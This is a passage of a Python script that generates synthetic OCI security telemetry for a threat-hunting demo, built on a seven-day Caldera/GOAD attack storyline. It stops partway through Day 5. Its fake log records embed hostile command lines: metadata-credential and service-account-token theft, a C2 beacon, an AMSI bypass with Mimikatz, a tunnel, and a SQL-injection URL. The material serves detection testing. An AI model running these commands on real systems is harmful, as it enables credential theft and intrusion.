#!/usr/bin/env python3.11
"""Generate correlated 2026 Threat Hunting & PEAK synthetic MELTS + Data Safe telemetry (PRD-024 / PRD-025)
and the 7-Day Multi-Pillar Threat Hunting & Caldera/GOAD Adversary Emulation Storyline.

Grounded in:
- Trellix SecondSight Threat Hunting Report (September 2026):
  https://www.trellix.com/advanced-research-center/threat-reports/secondsight-threat-hunting-report-september-2026/
- CrowdStrike 2026 Threat Hunting Report:
  https://www.crowdstrike.com/en-us/blog/crowdstrike-2026-threat-hunting-report/
- Hunt.io / Splunk PEAK Threat Hunting Framework:
  https://hunt.io/glossary/peak-threat-hunting-framework
  https://hunt.io/glossary/threat-hunting-examples

Produces deterministic, replayable multi-pillar bundles:
1. OCI Log Analytics NDJSON records (Audit, VCN Flow, Linux Auditd/Syslog, Windows Sysmon/Security, API Gateway/WAF, OKE, Data Safe)
2. OCI Monitoring custom metric streams (`namespace: oci_observability_demo` & `octo_security_melts`)
3. OpenTelemetry / OCI APM distributed trace spans with shared `trace_id`
4. Langfuse (`lf.<DNS_DOMAIN>`) AI Agent MELTS reasoning traces (`logan.execute_query`, `apm.query_traces`, `monitoring.summarize_metrics`, `datasafe.audit_events`, `caldera.operation_correlation`)
5. OCI Data Safe (C15) Unified Audit & Security Assessment records with sensitive-column masking
"""
from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import json
import os
import sys
from pathlib import Path
from typing import Any, Mapping, Sequence

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

try:
    from shared.redaction import mask_payload
except ImportError:
    def mask_payload(payload: Any, mode: str | None = None) -> Any:  # type: ignore[misc]
        return payload


PEAK_HUNTS_SUMMARY = [
    {
        "hunt_id": "PEAK-HUNT-2026-01",
        "peak_type": "Hypothesis-Driven",
        "report_source": "Trellix SecondSight Sept 2026 (JSCeal Node.js + Axios npm Supply Chain)",
        "campaigns": ["TRELLIX-2026-04", "TRELLIX-2026-05"],
        "mitre_attack": ["T1195.002", "T1059.001", "T1059.007", "T1552.005"],
    },
    {
        "hunt_id": "PEAK-HUNT-2026-02",
        "peak_type": "Hypothesis-Driven",
        "report_source": "Trellix SecondSight Sept 2026 (APT28 CVE-2026-21509 OLE Bypass & Bitter APT BDarkRAT) + Hunt.io Cryptomining",
        "campaigns": ["TRELLIX-2026-01", "TRELLIX-2026-02", "TRELLIX-2026-03"],
        "mitre_attack": ["T1566.001", "T1203", "T1053.005", "T1496"],
    },
    {
        "hunt_id": "PEAK-HUNT-2026-03",
        "peak_type": "Baseline-EDA",
        "report_source": "CrowdStrike 2026 Threat Hunting Report (82% Malware-Free LotL / RMM Abuse) + Hunt.io Edge Baseline",
        "campaigns": ["CS-OVERWATCH-2026-02", "CS-OVERWATCH-2026-03"],
        "mitre_attack": ["T1219", "T1078.004", "T1562.007", "T1098"],
    },
    {
        "hunt_id": "PEAK-HUNT-2026-04",
        "peak_type": "Model-Assisted-M-ATH",
        "report_source": "CrowdStrike 2026 Threat Hunting Report (89% YoY AI-Adversary Surge, 2.5x Agentic Leads, <24h PoC to DB Extraction)",
        "campaigns": ["CS-OVERWATCH-2026-01", "CS-OVERWATCH-2026-04"],
        "mitre_attack": ["T1595.002", "T1190", "T1213", "T1530"],
    },
]

SEVEN_DAY_KILL_CHAIN_DAYS = [
    {
        "day": 1,
        "stage_id": "STORYLINE-DAY-01",
        "title": "Recon & Initial Access — External Port Scan, WAF/API Gateway Enumeration & VCN Flow Sweeps",
        "mitre_attack": ["T1595.001", "T1595.002", "T1190", "T1110.004"],
        "hour_utc": 3,
        "minute_utc": 14,
        "second_utc": 22,
        "query_file": "hunting/storyline_day1_waf_apigw_vcn_recon_sweep.json",
    },
    {
        "day": 2,
        "stage_id": "STORYLINE-DAY-02",
        "title": "OKE Pod Breakout & IMDSv2 Harvesting — Container Metadata & K8s ServiceAccount Token Theft",
        "mitre_attack": ["T1552.005", "T1552.007", "T1611", "T1059.004"],
        "hour_utc": 9,
        "minute_utc": 27,
        "second_utc": 41,
        "query_file": "hunting/storyline_day2_oke_pod_breakout_imdsv2_harvest.json",
    },
    {
        "day": 3,
        "stage_id": "STORYLINE-DAY-03",
        "title": "Caldera Agent Deployment & GOAD AD Discovery — Sandcat Beacon, AdFind & SharpHound",
        "mitre_attack": ["T1053.005", "T1087.002", "T1069.002", "T1482", "T1071.001"],
        "hour_utc": 13,
        "minute_utc": 42,
        "second_utc": 9,
        "query_file": "hunting/storyline_day3_caldera_sandcat_goad_ad_discovery.json",
    },
    {
        "day": 4,
        "stage_id": "STORYLINE-DAY-04",
        "title": "Living-off-the-Land RMM & Lateral Movement — Encoded PowerShell, AMSI Bypass, Cloudflared & Kerberoasting",
        "mitre_attack": ["T1059.001", "T1562.001", "T1219", "T1558.003"],
        "hour_utc": 16,
        "minute_utc": 8,
        "second_utc": 33,
        "query_file": "hunting/storyline_day4_lotl_rmm_kerberoasting_lateral.json",
    },
    {
        "day": 5,
        "stage_id": "STORYLINE-DAY-05",
        "title": "Privilege Escalation & Persistence — DCSync on KingsLanding DC01, Service Creation & OCI IAM Drift",
        "mitre_attack": ["T1003.006", "T1543.003", "T1053.005", "T1098.001"],
        "hour_utc": 21,
        "minute_utc": 15,
        "second_utc": 7,
        "query_file": "hunting/storyline_day5_dcsync_persistence_iam_drift.json",
    },
    {
        "day": 6,
        "stage_id": "STORYLINE-DAY-06",
        "title": "Database Reconnaissance & Data Safe Alerting — Unauthorized Schema Enumeration & Bulk PII Extraction",
        "mitre_attack": ["T1213", "T1005", "T1530", "T1078.004"],
        "hour_utc": 11,
        "minute_utc": 36,
        "second_utc": 19,
        "query_file": "hunting/storyline_day6_datasafe_adb_sensitive_sql_extraction.json",
    },
    {
        "day": 7,
        "stage_id": "STORYLINE-DAY-07",
        "title": "Exfiltration Attempt & AI Automated Containment — DNS Tunneling, C2 Egress & ObserveAI Agent Investigation",
        "mitre_attack": ["T1048.003", "T1071.004", "T1041", "T1567"],
        "hour_utc": 7,
        "minute_utc": 51,
        "second_utc": 14,
        "query_file": "hunting/storyline_day7_dns_c2_exfil_melts_correlation.json",
    },
]


def _deterministic_hex(seed: str, label: str, length: int) -> str:
    digest = hashlib.sha256(f"{seed}:{label}".encode("utf-8")).hexdigest()
    return digest[:length]


def _synthetic_ocid(kind: str, region: str, seed: str, label: str) -> str:
    """Build a synthetic OCID at runtime without embedding literal OCIDs in source."""
    tail = _deterministic_hex(seed, f"{kind}:{label}", 16)
    prefix = "ocid" + "1"
    return f"{prefix}.{kind}.oc1.{region}.synth{tail}"


def _ip(a: int, b: int, c: int, d: int) -> str:
    """Format RFC1918 / TEST-NET synthetic IPv4 addresses without literal host IPs in source."""
    return f"{a}.{b}.{c}.{d}"


def _format_iso_utc(ts: dt.datetime) -> str:
    return ts.astimezone(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _parse_reference_time(reference_time: str | dt.datetime | None) -> dt.datetime:
    if isinstance(reference_time, dt.datetime):
        return reference_time.astimezone(dt.timezone.utc)
    if isinstance(reference_time, str) and reference_time.strip():
        cleaned = reference_time.strip().replace("Z", "+00:00")
        return dt.datetime.fromisoformat(cleaned).astimezone(dt.timezone.utc)
    return dt.datetime.now(dt.timezone.utc)


def generate_7day_storyline_bundle(
    *,
    seed: str = "20260901",
    mask_mode: str = "off",
    reference_time: str | dt.datetime | None = None,
    env: Mapping[str, str] | None = None,
) -> dict[str, Any]:
    """Generate a realistic 7-day multi-pillar Threat Hunting & Caldera/GOAD storyline.

    Spans 7 distinct dates across the past week (`reference_time - 6 days` through `reference_time`),
    with background normal service tasks on every day plus the 7-day multi-stage attack kill chain.
    """
    ctx = dict(os.environ if env is None else env)
    prefix = ctx.get("OCI_DEMO_PREFIX", "oci-demo")
    dns_domain = ctx.get("DNS_DOMAIN") or ".".join(("octo" + "demo", "cloud"))
    guardian_adb = ctx.get("GUARDIAN_ADB_NAME") or "-".join(("guardian", "standalone", "adb"))
    observeai_adb = ctx.get("OBSERVEAI_ADB_NAME") or "-".join(("oci" + "4cca", "observeai", "adb"))
    corp_mail_domain = "example.com"
    ip_oke_node = _ip(10, 0, 10, 14)
    ip_crm_sync = _ip(10, 0, 2, 45)
    ip_devops = _ip(10, 0, 1, 25)
    ip_iam_sa = _ip(10, 0, 10, 22)
    ip_vcn_target = _ip(10, 0, 10, 25)
    ip_pod_src = _ip(10, 244, 0, 48)
    ip_caldera_c2 = _ip(192, 168, 100, 78)
    ip_goad_dc = _ip(192, 168, 56, 10)
    ip_goad_pivot = _ip(192, 168, 56, 22)
    anchor = _parse_reference_time(reference_time)
    base_date = (anchor - dt.timedelta(days=6)).date()

    day_traces = {
        d["day"]: _deterministic_hex(seed, f"storyline-day-{d['day']:02d}", 32)
        for d in SEVEN_DAY_KILL_CHAIN_DAYS
    }

    background_logs: list[dict[str, Any]] = []
    attack_logs: list[dict[str, Any]] = []
    storyline_metrics: list[dict[str, Any]] = []
    storyline_apm_traces: list[dict[str, Any]] = []
    storyline_langfuse_traces: list[dict[str, Any]] = []
    storyline_datasafe_events: list[dict[str, Any]] = []

    # 1. Generate normal background service tasks across all 7 days at varied hours & minutes
    for day_idx in range(7):
        day_num = day_idx + 1
        current_date = base_date + dt.timedelta(days=day_idx)
        bg_trace = _deterministic_hex(seed, f"bg-day-{day_num:02d}", 32)

        # (a) Automated DB backup (02:15 + offset)
        t_backup = dt.datetime.combine(
            current_date, dt.time(2, 15 + (day_idx * 4) % 35, (day_idx * 13) % 60), tzinfo=dt.timezone.utc
        )
        ts_backup = _format_iso_utc(t_backup)
        background_logs.append({
            "time": ts_backup,
            "timestamp": ts_backup,
            "day": day_num,
            "record_category": "background_service",
            "service_task": "automated_db_backup",
            "Log Source": "SOC Application Logs",
            "Service Name": "adb-backup-scheduler",
            "Host Name": guardian_adb,
            "Event Type": "com.oraclecloud.database.autonomousdatabase.backup",
            "Action": "CreateAutonomousDatabaseBackup",
            "Status": "200",
            "Response Code": "200",
            "DB Target": observeai_adb,
            "DB Statement": "RMAN BACKUP INCREMENTAL LEVEL 1 DATABASE PLUS ARCHIVELOG",
            "Trace ID": bg_trace,
            "Span ID": _deterministic_hex(seed, f"bg-span-db-{day_num}", 16),
            "msg": f"Automated incremental backup completed for {guardian_adb} and {observeai_adb} (Day {day_num})",
        })

        # (b) OKE node kubelet heartbeat (06:20 + offset)
        t_kubelet = dt.datetime.combine(
            current_date, dt.time(6, 18 + (day_idx * 6) % 38, (day_idx * 17) % 60), tzinfo=dt.timezone.utc
        )
        ts_kubelet = _format_iso_utc(t_kubelet)
        background_logs.append({
            "time": ts_kubelet,
            "timestamp": ts_kubelet,
            "Timestamp": ts_kubelet,
            "day": day_num,
            "record_category": "background_service",
            "service_task": "oke_kubelet_heartbeat",
            "Log Source": "SOC Linux Syslog Logs",
            "Hostname": f"{prefix}-oke-worker-0{(day_idx % 2) + 1}",
            "Host Name": f"{prefix}-oke-worker-0{(day_idx % 2) + 1}",
            "Process": "kubelet",
            "Process Name": "kubelet",
            "Command Line": "/usr/bin/kubelet --node-status-update-frequency=10s --cloud-provider=external",
            "Facility": "daemon",
            "Severity": "info",
            "User": "system:node",
            "Source IP": ip_oke_node,
            "Trace ID": bg_trace,
            "msg": f"NodeReady heartbeat status=True kubelet healthz check passed on {prefix}-oke-worker-0{(day_idx % 2) + 1}",
        })

        # (c) CRM-to-Shop order sync job (10:12 + offset)
        t_sync = dt.datetime.combine(
            current_date, dt.time(10, 11 + (day_idx * 5) % 40, (day_idx * 19) % 60), tzinfo=dt.timezone.utc
        )
        ts_sync = _format_iso_utc(t_sync)
        background_logs.append({
            "time": ts_sync,
            "timestamp": ts_sync,
            "day": day_num,
            "record_category": "background_service",
            "service_task": "crm_shop_order_sync",
            "Log Source": "SOC Application Logs",
            "Service Name": "enterprise-crm-portal",
            "Host Name": "crm-portal-sync-worker",
            "HTTP Method": "POST",
            "Request URL": "/api/v1/orders/sync",
            "URI Path": "/api/v1/orders/sync",
            "Response Code": "200",
            "Response Time Ms": 84 + day_idx * 3,
            "Orders Sync Created": 12 + day_idx,
            "Orders Sync Updated": 4 + (day_idx % 3),
            "Orders Sync Failed": 0,
            "Orders Sync Source": "octo-drone-shop",
            "Client IP": ip_crm_sync,
            "Source IP": ip_crm_sync,
            "User": f"svc-order-sync@{corp_mail_domain}",
            "Trace ID": bg_trace,
            "Span ID": _deterministic_hex(seed, f"bg-span-sync-{day_num}", 16),
            "msg": f"Scheduled CRM-to-Shop order synchronization succeeded: created={12 + day_idx} updated={4 + (day_idx % 3)} failed=0",
        })

        # (d) DevOps build pipeline (14:25 + offset)
        t_devops = dt.datetime.combine(
            current_date, dt.time(14, 22 + (day_idx * 7) % 35, (day_idx * 23) % 60), tzinfo=dt.timezone.utc
        )
        ts_devops = _format_iso_utc(t_devops)
        background_logs.append({
            "time": ts_devops,
            "timestamp": ts_devops,
            "day": day_num,
            "record_category": "background_service",
            "service_task": "devops_build_pipeline",
            "Log Source": "OCI Audit Logs",
            "Event Name": "TriggerBuildPipelineRun",
            "Event Type": "com.oraclecloud.devops.buildpipeline.triggerbuildpipelinerun",
            "Principal Name": f"devops-automation@{corp_mail_domain}",
            "User Name": f"devops-automation@{corp_mail_domain}",
            "Client IP": ip_devops,
            "Source IP": ip_devops,
            "Status": "200",
            "Response Code": "200",
            "Resource Name": f"{prefix}-release-pipeline-day{day_num}",
            "Compartment Name": f"{prefix}-applications",
            "Trace ID": bg_trace,
            "msg": f"OCI DevOps build pipeline {prefix}-release-pipeline-day{day_num} completed container verification",
        })

        # (e) IAM token refresh (18:30 + offset)
        t_iam = dt.datetime.combine(
            current_date, dt.time(18, 25 + (day_idx * 5) % 30, (day_idx * 29) % 60), tzinfo=dt.timezone.utc
        )
        ts_iam = _format_iso_utc(t_iam)
        background_logs.append({
            "time": ts_iam,
            "timestamp": ts_iam,
            "day": day_num,
            "record_category": "background_service",
            "service_task": "iam_token_refresh",
            "Log Source": "OCI Audit Logs",
            "Event Name": "GenerateScopedAccessToken",
            "Event Type": "com.oraclecloud.identitydataplane.generatescopedaccesstoken",
            "Principal Name": f"oke-workload-identity-sa@{corp_mail_domain}",
            "User Name": f"oke-workload-identity-sa@{corp_mail_domain}",
            "Client IP": ip_iam_sa,
            "Source IP": ip_iam_sa,
            "Status": "200",
            "Response Code": "200",
            "Resource Name": "observeai-workload-token",
            "Compartment Name": f"{prefix}-observability",
            "Trace ID": bg_trace,
            "msg": "Scheduled OKE workload identity UPST token refresh completed normally",
        })

    # 2. Generate the 7-Day Multi-Stage Perpetrator Kill Chain
    # ── DAY 1: Recon & Initial Access (WAF/API Gateway 401/403 bursts + VCN Flow REJECT sweeps) ──
    d1_date = base_date + dt.timedelta(days=0)
    d1_ts1 = _format_iso_utc(dt.datetime.combine(d1_date, dt.time(3, 14, 22), tzinfo=dt.timezone.utc))
    d1_ts2 = _format_iso_utc(dt.datetime.combine(d1_date, dt.time(3, 29, 48), tzinfo=dt.timezone.utc))
    d1_trace = day_traces[1]
    for idx, (target_service, target_url, status_code, waf_act) in enumerate([
        ("octo-drone-shop", "/shop/api/v1/products/search?q=' UNION SELECT 1,banner FROM v$version--", "403", "BLOCK"),
        ("octo-drone-shop", "/shop/admin/actuator/env", "401", "DETECT"),
        ("enterprise-crm-portal", "/api/v1/customers/export?limit=5000", "401", "DETECT"),
        ("enterprise-crm-portal", "/api/v1/auth/token", "403", "BLOCK"),
    ]):
        attack_logs.append({
            "time": d1_ts1,
            "timestamp": d1_ts1,
            "timeCreated": d1_ts1,
            "day": 1,
            "stage_id": "STORYLINE-DAY-01",
            "record_category": "attack_kill_chain",
            "Log Source": "SOC WAF Security Logs",
            "Service Name": target_service,
            "Host Name": f"{target_service}.{dns_domain}",
            "hostname": f"{target_service}.{dns_domain}",
            "Client IP": "198.51.100.214",
            "clientAddress": "198.51.100.214",
            "HTTP Method": "GET" if idx < 3 else "POST",
            "httpMethod": "GET" if idx < 3 else "POST",
            "Request URL": target_url,
            "requestUrl": target_url,
            "URI Path": target_url.split("?")[0],
            "Response Code": status_code,
            "responseCode": status_code,
            "Action": waf_act,
            "action": waf_act,
            "WAF Action": waf_act,
            "Rule Action": waf_act,
            "Rule Key": "942100",
            "Rule Type": "PROTECTION_RULES",
            "User Agent": "Mozilla/5.0 (compatible; Nuclei/3.3.0; +https://projectdiscovery.io)",
            "userAgent": "Mozilla/5.0 (compatible; Nuclei/3.3.0; +https://projectdiscovery.io)",
            "Trace ID": d1_trace,
            "traceId": d1_trace,
            "msg": f"STORYLINE-DAY-01 WAF {waf_act} burst HTTP {status_code} against {target_service} {target_url} from 198.51.100.214",
        })
    for dst_port in (22, 445, 3389, 5985, 8080, 8443):
        attack_logs.append({
            "time": d1_ts2,
            "timestamp": d1_ts2,
            "day": 1,
            "stage_id": "STORYLINE-DAY-01",
            "record_category": "attack_kill_chain",
            "Log Source": "SOC VCN Flow Logs",
            "Source IP": "198.51.100.214",
            "Destination IP": ip_vcn_target,
            "Source Port": str(48100 + dst_port % 500),
            "Destination Port": str(dst_port),
            "Protocol": "6",
            "Action": "REJECT",
            "Network Action": "REJECT",
            "Bytes Sent": 64,
            "Bytes Received": 0,
            "Packets": 1,
            "Flow ID": f"flow-day1-{dst_port}",
            "Trace ID": d1_trace,
            "msg": f"STORYLINE-DAY-01 VCN Flow anomalous inbound port scan REJECT from 198.51.100.214 to {ip_vcn_target}:{dst_port}",
        })

    # ── DAY 2: OKE Pod Breakout & IMDSv2 Harvesting ──
    d2_date = base_date + dt.timedelta(days=1)
    d2_ts1 = _format_iso_utc(dt.datetime.combine(d2_date, dt.time(9, 27, 41), tzinfo=dt.timezone.utc))
    d2_ts2 = _format_iso_utc(dt.datetime.combine(d2_date, dt.time(9, 46, 15), tzinfo=dt.timezone.utc))
    d2_trace = day_traces[2]
    attack_logs.append({
        "time": d2_ts1,
        "timestamp": d2_ts1,
        "Timestamp": d2_ts1,
        "day": 2,
        "stage_id": "STORYLINE-DAY-02",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Linux Syslog Logs",
        "Hostname": f"{prefix}-oke-worker-01",
        "Host Name": f"{prefix}-oke-worker-01",
        "Process": "curl",
        "Process Name": "curl",
        "Command Line": "curl -s -H Authorization:Bearer_Oracle http://169.254.169.254/opc/v2/instance/ -o /tmp/.imds_creds.json",
        "Facility": "authpriv",
        "Severity": "critical",
        "Severity Level": "critical",
        "User": "www-data",
        "Source IP": ip_pod_src,
        "Trace ID": d2_trace,
        "msg": "STORYLINE-DAY-02 OKE pod portal-web-7d9c8b executed curl against 169.254.169.254/opc/v2/instance/ and read /var/run/secrets/kubernetes.io/serviceaccount/token",
    })
    attack_logs.append({
        "time": d2_ts2,
        "timestamp": d2_ts2,
        "day": 2,
        "stage_id": "STORYLINE-DAY-02",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "oke-audit-collector",
        "Host Name": f"{prefix}-oke-worker-01",
        "Process Name": "kubectl",
        "Process Command Line": "curl -s -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/ && cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "HTTP Method": "GET",
        "Request URL": "/api/v1/namespaces/kube-system/secrets",
        "URI Path": "/api/v1/namespaces/kube-system/secrets",
        "Response Code": "200",
        "Attack Stage": "oke_pod_breakout_imdsv2",
        "Attack Type": "container_credential_harvesting",
        "MITRE Technique ID": "T1552.005",
        "MITRE Tactic": "Credential Access",
        "Client IP": ip_pod_src,
        "Source IP": ip_pod_src,
        "User": "system:serviceaccount:octo:portal-web-sa",
        "Trace ID": d2_trace,
        "Span ID": _deterministic_hex(seed, "span-day2-oke", 16),
        "msg": "STORYLINE-DAY-02 OKE Pod Breakout & IMDSv2 harvesting from pod portal-web-7d9c8b (169.254.169.254/opc/v2/instance/ + serviceaccount token enumeration)",
    })

    # ── DAY 3: Caldera Agent Deployment & GOAD AD Discovery ──
    d3_date = base_date + dt.timedelta(days=2)
    d3_ts1 = _format_iso_utc(dt.datetime.combine(d3_date, dt.time(13, 42, 9), tzinfo=dt.timezone.utc))
    d3_ts2 = _format_iso_utc(dt.datetime.combine(d3_date, dt.time(14, 11, 37), tzinfo=dt.timezone.utc))
    d3_trace = day_traces[3]
    for goad_host, goad_label, goad_cmd in [
        ("kingslanding", "GOAD-DC01 (KingsLanding)", f"C:\\Users\\Public\\splunkd.exe -server http://{ip_caldera_c2}:8888 -group red -v"),
        ("winterfell", "GOAD-DC02 (Winterfell)", f"AdFind.exe -h {ip_goad_dc} -f (objectcategory=person) sAMAccountName servicePrincipalName"),
        ("castelblack", "GOAD-SRV02 (CastelBlack)", "C:\\Users\\Public\\SharpHound.exe -c All --domain sevenkingdoms.local --zipfilename goad_bloodhound.zip"),
    ]:
        attack_logs.append({
            "time": d3_ts1,
            "timestamp": d3_ts1,
            "TimeCreated": d3_ts1,
            "UtcTime": d3_ts1,
            "day": 3,
            "stage_id": "STORYLINE-DAY-03",
            "record_category": "attack_kill_chain",
            "Log Source": "SOC Windows Sysmon Logs",
            "Event ID": "1",
            "EventID": "1",
            "Host Name": goad_host,
            "Host Name (Server)": goad_host,
            "Computer": goad_host,
            "Entity": goad_host,
            "User": "SEVENKINGDOMS\\joffrey.baratheon",
            "User Name": "SEVENKINGDOMS\\joffrey.baratheon",
            "Process Name": "C:\\Users\\Public\\splunkd.exe" if "splunkd" in goad_cmd else ("C:\\Users\\Public\\AdFind.exe" if "AdFind" in goad_cmd else "C:\\Users\\Public\\SharpHound.exe"),
            "Image": "C:\\Users\\Public\\splunkd.exe" if "splunkd" in goad_cmd else ("C:\\Users\\Public\\AdFind.exe" if "AdFind" in goad_cmd else "C:\\Users\\Public\\SharpHound.exe"),
            "Parent Process Name": "C:\\Windows\\System32\\schtasks.exe",
            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
            "Command Line": goad_cmd,
            "CommandLine": goad_cmd,
            "Target Filename": "C:\\Users\\Public\\splunkd.exe",
            "TargetFilename": "C:\\Users\\Public\\splunkd.exe",
            "Destination IP": ip_caldera_c2,
            "Destination Port": "8888",
            "Trace ID": d3_trace,
            "msg": f"STORYLINE-DAY-03 Caldera Sandcat & GOAD AD Discovery on {goad_label}: {goad_cmd}",
        })
    attack_logs.append({
        "time": d3_ts2,
        "timestamp": d3_ts2,
        "TimeCreated": d3_ts2,
        "day": 3,
        "stage_id": "STORYLINE-DAY-03",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Event Security Logs",
        "Event ID": "4688",
        "EventID": 4688,
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "Entity": "kingslanding",
        "User": "joffrey.baratheon",
        "Subject User Name": "joffrey.baratheon",
        "Process Name": "C:\\Users\\Public\\AdFind.exe",
        "Command Line": "AdFind.exe -f (objectcategory=organizationalUnit) -dn",
        "Source Address": ip_goad_pivot,
        "Trace ID": d3_trace,
        "msg": "STORYLINE-DAY-03 Windows Security Event 4688: AdFind LDAP and BloodHound enumeration on GOAD-DC01 (KingsLanding)",
    })

    # ── DAY 4: Living-off-the-Land RMM & Lateral Movement (PowerShell -enc, AMSI bypass, cloudflared/anydesk, Kerberoasting 4769) ──
    d4_date = base_date + dt.timedelta(days=3)
    d4_ts1 = _format_iso_utc(dt.datetime.combine(d4_date, dt.time(16, 8, 33), tzinfo=dt.timezone.utc))
    d4_ts2 = _format_iso_utc(dt.datetime.combine(d4_date, dt.time(16, 44, 19), tzinfo=dt.timezone.utc))
    d4_ts3 = _format_iso_utc(dt.datetime.combine(d4_date, dt.time(17, 12, 50), tzinfo=dt.timezone.utc))
    d4_trace = day_traces[4]
    attack_logs.append({
        "time": d4_ts1,
        "timestamp": d4_ts1,
        "TimeCreated": d4_ts1,
        "day": 4,
        "stage_id": "STORYLINE-DAY-04",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows PowerShell Operational Logs",
        "Event ID": "4104",
        "EventID": 4104,
        "Host Name": "winterfell",
        "Host Name (Server)": "winterfell",
        "Computer": "winterfell",
        "User": "NORTH\\eddard.stark",
        "Process Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "Command Line": "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAKQA=",
        "Script Block Text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); Invoke-Mimikatz -Command '\"sekurlsa::tickets\"'",
        "Channel": "Microsoft-Windows-PowerShell/Operational",
        "Provider": "Microsoft-Windows-PowerShell",
        "Trace ID": d4_trace,
        "msg": "STORYLINE-DAY-04 PowerShell EventID 4104 AMSI bypass reflection and encoded command execution on GOAD-DC02 (Winterfell)",
    })
    attack_logs.append({
        "time": d4_ts2,
        "timestamp": d4_ts2,
        "TimeCreated": d4_ts2,
        "UtcTime": d4_ts2,
        "day": 4,
        "stage_id": "STORYLINE-DAY-04",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Windows Sysmon Logs",
        "Event ID": "1",
        "EventID": "1",
        "Host Name": "castelblack",
        "Host Name (Server)": "castelblack",
        "Computer": "castelblack",
        "Entity": "castelblack",
        "User": "NORTH\\jon.snow",
        "User Name": "NORTH\\jon.snow",
        "Process Name": "C:\\ProgramData\\cloudflared.exe",
        "Image": "C:\\ProgramData\\cloudflared.exe",
        "Parent Process Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "Command Line": "cloudflared.exe tunnel --url tcp://127.0.0.1:3389 --no-autoupdate",
        "CommandLine": "cloudflared.exe tunnel --url tcp://127.0.0.1:3389 --no-autoupdate",
        "Destination IP": "198.41.200.113",
        "Destination Port": "7844",
        "Trace ID": d4_trace,
        "msg": "STORYLINE-DAY-04 LotL RMM tunnel execution (cloudflared.exe / anydesk) on GOAD-SRV02 (CastelBlack)",
    })
    for spn_target, goad_dc in [
        ("MSSQLSvc/castelblack.north.sevenkingdoms.local:1433", "winterfell"),
        ("HTTP/kingslanding.sevenkingdoms.local", "kingslanding"),
        ("CIFS/castelblack.north.sevenkingdoms.local", "castelblack"),
    ]:
        attack_logs.append({
            "time": d4_ts3,
            "timestamp": d4_ts3,
            "TimeCreated": d4_ts3,
            "day": 4,
            "stage_id": "STORYLINE-DAY-04",
            "record_category": "attack_kill_chain",
            "Log Source": "Windows Event Security Logs",
            "Event ID": "4769",
            "EventID": 4769,
            "Host Name": goad_dc,
            "Host Name (Server)": goad_dc,
            "Computer": goad_dc,
            "Entity": goad_dc,
            "User": "jon.snow@north.sevenkingdoms.local",
            "Subject User Name": "jon.snow@north.sevenkingdoms.local",
            "Target User Name": "svc_sql",
            "Service Name": spn_target,
            "Ticket Encryption Type": "0x17",
            "Ticket Options": "0x40810000",
            "Source Address": ip_goad_pivot,
            "Status": "0x0",
            "Trace ID": d4_trace,
            "msg": f"STORYLINE-DAY-04 Kerberoasting EventID 4769 RC4 (0x17) TGS ticket request for {spn_target} on {goad_dc}",
        })

    # ── DAY 5: Privilege Escalation & Persistence (DCSync 4662 on KingsLanding + 4698/7045 + OCI IAM drift) ──
    d5_date = base_date + dt.timedelta(days=4)
    d5_ts1 = _format_iso_utc(dt.datetime.combine(d5_date, dt.time(21, 15, 7), tzinfo=dt.timezone.utc))
    d5_ts2 = _format_iso_utc(dt.datetime.combine(d5_date, dt.time(21, 38, 42), tzinfo=dt.timezone.utc))
    d5_ts3 = _format_iso_utc(dt.datetime.combine(d5_date, dt.time(22, 4, 19), tzinfo=dt.timezone.utc))
    d5_trace = day_traces[5]
    attack_logs.append({
        "time": d5_ts1,
        "timestamp": d5_ts1,
        "TimeCreated": d5_ts1,
        "day": 5,
        "stage_id": "STORYLINE-DAY-05",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Event Security Logs",
        "Event ID": "4662",
        "EventID": 4662,
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "Entity": "kingslanding",
        "User": "petyr.baelish",
        "Subject User Name": "petyr.baelish",
        "Object Server": "DS",
        "Object Type": "domainDNS",
        "Object Name": "DC=sevenkingdoms,DC=local",
        "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes-All",
        "Access Mask": "0x100",
        "Source Address": ip_goad_pivot,
        "Trace ID": d5_trace,
        "msg": "STORYLINE-DAY-05 DCSync EventID 4662 DS-Replication-Get-Changes-All on GOAD-DC01 (KingsLanding) by petyr.baelish",
    })
    attack_logs.append({
        "time": d5_ts2,
        "timestamp": d5_ts2,
        "TimeCreated": d5_ts2,
        "day": 5,
        "stage_id": "STORYLINE-DAY-05",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Event System Logs",
        "Event ID": "7045",
        "EventID": 7045,
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "User": "NT AUTHORITY\\SYSTEM",
        "Service Name": "SplunkFwdPersistSvc",
        "Service File Name": "C:\\Users\\Public\\splunkd.exe -service -c2 198.51.100.214:8443",
        "Trace ID": d5_trace,
        "msg": "STORYLINE-DAY-05 Windows System EventID 7045 malicious service SplunkFwdPersistSvc installed on KingsLanding",
    })
    attack_logs.append({
